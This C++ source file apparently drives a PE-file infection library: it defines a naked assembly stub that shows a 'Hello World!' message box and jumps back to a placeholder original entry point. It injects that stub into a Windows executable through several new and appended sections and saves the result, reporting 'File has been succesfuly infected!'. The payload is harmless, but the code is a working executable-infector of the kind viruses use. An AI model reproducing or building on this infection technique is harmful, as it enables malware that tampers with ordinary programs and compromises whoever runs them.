
#include "PEFile.h"
#include <iostream>

int main(int, char**);
__declspec(naked) void TestStub()
{
	__asm
	{
		push 0
		push 0x21646C72
		push 0x6F57206F
		push 0x6C6C6548
		mov ebx, esp

		mov eax, 0x74FBFD1E
		push 0
		push ebx
		push ebx
		push 0
		call eax
		push 0x12345678
		ret
	}
}

int main(int argc, char* argv[])
{
	try
	{
		PEFile f("c:/OLLYDBG.exe");
		size_t funcSize = PEFile::Tools::GetFunctionSize(TestStub);
		f.InfectCreateNewSection(".test", reinterpret_cast<char const*>(&TestStub), funcSize, funcSize - 5);
		f.InfectCreateNewSection(".test2", reinterpret_cast<char const*>(&TestStub), funcSize, funcSize - 5);
		f.InfectLastSection(reinterpret_cast<char const*>(&TestStub), funcSize, funcSize - 5);
		f.InfectLastSection(reinterpret_cast<char const*>(&TestStub), funcSize, funcSize - 5);
		f.InfectLastSection(reinterpret_cast<char const*>(&TestStub), funcSize, funcSize - 5);
		f.SaveAs("c:/FrequencyTester - modified.exe");
		std::cout << "File has been succesfuly infected! " << std::endl;
	}
	catch (std::runtime_error& e)
	{
		std::cout << e.what();
	}
	std::cin.get();
	return 0;
}

